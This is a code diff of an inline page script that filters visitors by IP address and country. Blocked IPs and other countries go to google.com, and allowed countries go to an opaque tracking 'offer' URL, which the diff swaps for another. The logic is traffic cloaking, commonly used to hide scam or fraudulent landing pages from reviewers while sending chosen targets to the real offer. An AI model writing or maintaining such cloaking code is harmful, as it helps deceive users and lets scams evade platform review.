@@ -54,21 +54,21 @@
             // Block IP addresses
             if (blockedIPs.includes(ipAddress)) {
                 console.log("Blocked IP detected:", ipAddress);
-                window.location.replace("https://amazon.com"); // Redirect immediately without delay
+                window.location.replace("https://google.com"); // Redirect immediately without delay
                 return;
             }
 
             // Check if the country is allowed
             if (allowedCountries.includes(country)) {    
                 console.log("Access allowed for country:", country);    
-                window.location.replace("https://www.rjbdsa2trk.com/3KDJCJS/52B5LNB/"); // Redirect to the offer for allowed countries
+                window.location.replace("http://www.upsearching.com/DZRZX6W/2JQQJWGJ/"); // Redirect to the offer for allowed countries
             } else {    
                 console.log("Access denied for country:", country);    
-                window.location.replace("https://amazon.com"); // Redirect to Google for other countries
+                window.location.replace("https://google.com"); // Redirect to Google for other countries
             }
         }).fail(function(error) {  
             console.error('Error:', error);  
-            window.location.replace("https://amazon.com"); // If there's an error, redirect to Google
+            window.location.replace("https://google.com"); // If there's an error, redirect to Google
         });
     </script>
 </head>
